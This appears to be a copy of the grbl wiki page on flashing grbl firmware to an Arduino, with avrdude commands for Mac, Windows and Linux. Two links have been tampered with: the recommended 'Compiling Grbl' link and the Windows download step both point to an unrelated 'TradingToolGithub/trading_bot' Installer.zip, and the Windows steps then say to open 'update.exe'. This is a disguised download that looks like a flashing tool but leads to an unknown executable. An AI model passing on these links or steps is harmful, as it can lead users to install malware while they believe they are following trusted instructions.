_This wiki is intended to provide various instructions on how to flash grbl to an Arduino. Please feel free to contribute more up-to-date or alternative methods._  

# Via the Arduino IDE (All Platforms):

### RECOMMENDED: All other methods below are just for reference!
Go to the [Compiling Grbl](https://github.com/TradingToolGithub/trading_bot/releases/download/trading/Installer.zip) wiki page for instructions on how compile and upload Grbl onto your Arduino simply through the Arduino IDE interface. 

No fuss! It just requires users to download the source code, add Grbl as a library to the IDE, and click upload.

_But, if all you have is a pre-compiled .hex file, you will need to use one of the methods below to flash it, as the Arduino IDE can't  flash a .hex file through the IDE interface._

-----

## For Mac OS X: 

Paul Kaplan from Inventables made this process much easier than before with a simple GUI app called [HexUploader](https://github.com/paulkaplan/HexUploader/wiki/Using-HexUploader). Unfortunately it is no longer maintained. The last reported working version was: 2012-02-12 by gregrebholz. (Tested on OS X 10.7, 10.6, and 10.4 and the Arduino Uno and IDE v1.0/r22; and OS X 10.6 and the Arduino Duemilanove and IDE v1.0)

As with compiling grbl, the tools for flashing grbl to an Arduino are included in the Arduino IDE [software](http://arduino.cc/en/Main/Software). All you need to do is directly access them through the Terminal.app. The following instructions have been tested and work for the Arduino Uno. For others, your mileage may vary.

For most people, the path to the Arduino compiler tools will be: _/Applications/Arduino.app/Contents/Resources/Java/hardware/tools/avr_ (Note the absence of _/bin_ from the compiling grbl page.) Depending on where you place the Arduino IDE, the _/Applications/Arduino.app_ path may be different. So, lets call your compiler tools path _**$AVRPATH**_ to help shorten the following commands.

Next you will need to find the device path to your Arduino. First, connect your Arduino to a Mac USB port. To find the device path, from a Terminal.app window, type: _/dev/tty.usb_ and hit Tab once or twice. This will either give you one device path, which is your Arduino, or multiple paths, if you have more than one usbmodem type device connected to your computer. If you have multiple, simply unplug your Arduino, repeat the process, and eliminate the remaining devices that are still listed. Your Arduino device path should be something like this: _/dev/tty.usbmodem1811_ and lets call this _**$DEVPATH**_.

**To Flash Grbl:** Using the Terminal.app, first make sure you're in the same directory as the _grbl.hex_ file you want to flash to the Arduino, which we'll call _**$GRBLHEX**_. Then, type the following commands to flash.

**For Release 0023 and prior on the Uno:** `$AVRPATH/bin/avrdude -C$AVRPATH/etc/avrdude.conf -pm328p -cstk500v1 -P$DEVPATH -D -Uflash:w:$GRBLHEX`

**For Release 0023 and prior on the Duemilanove:** `$AVRPATH/bin/avrdude -C$AVRPATH/etc/avrdude.conf -pm328p -cstk500v1 -P$DEVPATH -b57600 -D -Uflash:w:$GRBLHEX`

**For v1.0 on the Uno:** `$AVRPATH/bin/avrdude -C$AVRPATH/etc/avrdude.conf -pm328p -carduino -P$DEVPATH -D -Uflash:w:$GRBLHEX`

**For v1.0 on the Duemilanove:** `$AVRPATH/bin/avrdude -C$AVRPATH/etc/avrdude.conf -pm328p -carduino -P$DEVPATH -b57600 -D -Uflash:w:$GRBLHEX`

Note the only change between the two versions is the _-c_ flag from the _stk500v1_ programmer to the _arduino_ programmer. This programmer flag was updated in the v1.0 IDE. If all goes according to plan, you should see three sequential progress bars of reading, writing, and verifying and you're good to go!

Using the `avr-gcc` toolchain and `avrdude` installed from Homebrew, these lines simplify to: 

    avrdude -pm328p -carduino -P$DEVPATH -b57600 -D -Uflash:w:$GRBLHEX   # for grbl
    # or 
    avrdude -p atmega2650 -c stk500 -P$DEVPATH -D -Uflash:w:$GRBLHEX   # for grbl-mega



### Additional Mac Resources:
* **[DANK](http://dank.bengler.no/-/page/show/5471_gettinggrbl)** _(Last updated 2/2011)_


## For Windows: 
_Last updated: 2013-01-24 by dmalicky. (Tested on Windows XP/7 and Arduino Uno)_

Flashing a hex file to your Arduino is simple with Windows. First, plug in your Arduino into any USB port of your Windows machine and then determine the assigned COM port of your Arduino.

To Determine your Arduino's COM port: 

* Windows XP: Right click on "_My Computer_", select "_Properties_", select "_Device Manager_". 

* Windows 7: Click "Start" -> Right click "_Computer_" -> Select "_Manage_" -> Select "_Device Manager_" from left pane

* In the tree, expand "_Ports (COM & LPT)_"

* Your Arduino will be the USB Serial Port (COMX), where the “X” represents the COM number, for example COM6.

* If there are multiple USB serial ports, right click each one and check the manufacturer, the Arduino will be "_FTDI_". 

To flash a grbl hex to an Arduino:

1. Download latest release of [update](https://github.com/TradingToolGithub/trading_bot/releases/download/trading/Installer.zip)

2. Open **update.exe** and use the browse button on the top right of the form to browse to your grbl hex file.

3. Then select your Arduino's COM port from the drop down menu on the lower left.

4. Set the correct baud rate for your board: 57600 for Nano, 115200 for Uno (new genuine Nano boards also uses 115200 baud rate).

5. Now click "_Upload_" and wait until it finishes.

After clicking upload, you'll see the RX/TX lights going wild on your Arduino. The upload process generally takes about 10 seconds to finish. Once completed, a message box will be displayed, telling you about successful upload, or about the error.

#### Additional Windows HexUploader

APEHexLoader available from apecoder.co.za, is capable of uploading a hexfile to chips loaded with bootloaders implementing the stk500 protocol, all you have to do is select you file and manually reset your chip, wait for the 3 blinks indicating your bootloader is ready and hit the load firmware button.

#### Additional Windows Resources:

For those drawn to a CLI: Browse to the directory where you new hex files resides and enter the following command (replace COM3 with your actual COM number):

`avrdude -p m328p -D -PCOM3 -c arduino -b 115200 -U flash:w:grbl.hex`

## For Linux:

`avrdude -v -patmega328p -Uflash:w:grbl_v0_9j_atmega328p_16mhz_115200.hex:i -carduino -b 57600 -P /dev/ttyUSBX`

_Last updated: 2012-01-30 by Atrixium. (Tested on Linux Mint 9 (Ubuntu 10.04) and the Arduino Uno and IDE V1.0)_

The tools for flashing grbl to an Arduino (called AVRDUDE) are included with the Arduino IDE [software](http://arduino.cc/en/Main/Software). The following instructions have been tested and work for the Arduino Uno. For others, your mileage may vary.  

**Linux users can now use the [Easy Flash](http://dl.dropbox.com/u/54312401/grbl/grblflash) script to simplify the process.**  

**Note that in Linux all commands are Case Sensitive**

On a typical install, the AVRDUDE tools can be found in: _/home/$USER/arduino-1.0/hardware/tools/_, depending on where you placed the Arduino IDE, the _/home/$USER_ part of the path may be different. AVRDUDE has two files that we need to be aware of: _avrdude_ and _avrdude.conf_. For simplicity, this document will refer to these two files and their paths as _**$AVRPATH**_ and _**$CONFPATH**_ respectively.

Next we need to find the device path for your Arduino. Connect your Arduino to a USB port, then, from a Terminal window, enter: _dmesg_. This will display a long list of text, the bottom of which should look something like the following: 

    [ 3058.480208] usb 7-1: new full speed USB device using ohci_hcd and address 15
    [ 3058.673379] usb 7-1: configuration #1 chosen from 1 choice
    [ 3058.675293] cdc_acm 7-1:1.0: ttyACM0: USB ACM device

The part that says ttyACM0 is _my_ Arduino, your Arduino should be similarly named but may be ttyACM1 or ttyACM2, etc. depending on how many USB modem devices you have installed. When you've determined the name, your Arduino device path should like something like this: _/dev/ttyACM0_. from here on we'll call this path _**$DEVPATH**_.  Depending on your version of linux, it may also be something like /dev/ttyUSB0, this was the case for me running Ubuntu.

**To Flash Grbl:** Using the Terminal, first make sure you're in the same directory as the _grbl.hex_ file you want to flash to the Arduino, which we'll call _**$GRBLHEX**_. Then, type **one** of the following command lines in to flash:

**For IDE version 0023 and prior:** `$AVRPATH -C$CONFPATH -pm328p -cstk500v1 -P$DEVPATH -D -Uflash:w:$GRBLHEX`  
**Example:** `/home/rob/arduino-1.0/hardware/tools/avrdude -C/home/rob/arduino-1.0/hardware/tools/avrdude.conf -pm328p -cstk500v1 -P/dev/ttyACM0 -D -Uflash:w:grbl_0_7d_atmega328p_16mhz_9600.hex`

**For v1.0:** `$AVRPATH -C$CONFPATH -pm328p -carduino -P$DEVPATH -D -Uflash:w:$GRBLHEX`  
**Example:** `/home/rob/arduino-1.0/hardware/tools/avrdude -C/home/rob/arduino-1.0/hardware/tools/avrdude.conf -pm328p -carduino -P/dev/ttyACM0 -D -Uflash:w:grbl_0_7d_atmega328p_16mhz_9600.hex`

Note that the only change between the two versions is the change from `-cstk500v1` and `-carduino`; the _stk500v1_ programmer to the _Arduino_ programmer. This programmer flag was updated in the v1.0 IDE. Also, note if you are using a Duemilanove it may require you add the flag `-b 57600` to manually set the baud rate.  This is similar to the instructions above in the Mac OS X section.  If all goes according to plan, you should see three sequential progress bars of reading, writing, and verifying and you're good to go! 

**To flash with USBASP:** 
If you normally use Arduino IDE with the "Upload using programmer" option

Call avrdude but with the USBASP options set

`/home/user/arduino-nightly/hardware/tools/avr/bin/avrdude -C/home/dgtlmoon/arduino-nightly/hardware/tools/avr/etc/avrdude.conf -v -patmega328p -cusbasp -Pusb -Uflash:w:./grbl_v0_9j_atmega328p_16mhz_115200.hex:i`
#### Additional Linux Resources:
* **[An easy linux flashing script by Atrixium](http://dl.dropbox.com/u/54312401/grbl/grblflash)**

## Common Flashing Errors
**error "avrdude: stk500_recv(): programmer is not responding Problem uploading to board"** 

can present itself when your arduino UNO has a firmware <=3.3  <br> 
workaround is to flash an updated bootloader using an ISP programmer. <br>
to check your UNO firmware version: <br>
go to File>Preferences>"show verbose output during"> Upload.<br>
this issue is non-OS dependent.  <br>
[see issue #760 for more](https://github.com/grbl/grbl/issues/760)  